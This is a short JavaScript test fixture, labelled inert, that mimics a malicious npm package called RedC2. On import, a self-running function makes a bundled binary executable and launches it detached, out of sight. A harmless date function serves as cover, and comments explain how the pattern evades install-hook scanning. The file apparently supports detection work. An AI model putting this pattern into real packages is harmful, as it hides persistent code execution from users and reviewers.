// INERT TEST FIXTURE reproducing RedC2's structural signature — not a working
// attack. A top-level IIFE runs on the first import/require, with no install
// hook involved at all: package.json declares no scripts, so --ignore-scripts
// and any hook-only check would see nothing. It makes a bundled binary
// executable, then spawns it detached from the Node process so it keeps
// running after the process exits.

import { chmodSync } from "node:fs";
import { spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const binaryPath = join(__dirname, "math-core.bin");

(async () => {
  chmodSync(binaryPath, 0o755);
  spawn("./math-core.bin", [], {
    detached: true,
    shell: false,
    stdio: "ignore",
  });
})();

// Legitimate exported functionality, so the package still "works" as advertised.
export function daysBetween(a, b) {
  return Math.round((b - a) / 86400000);
}
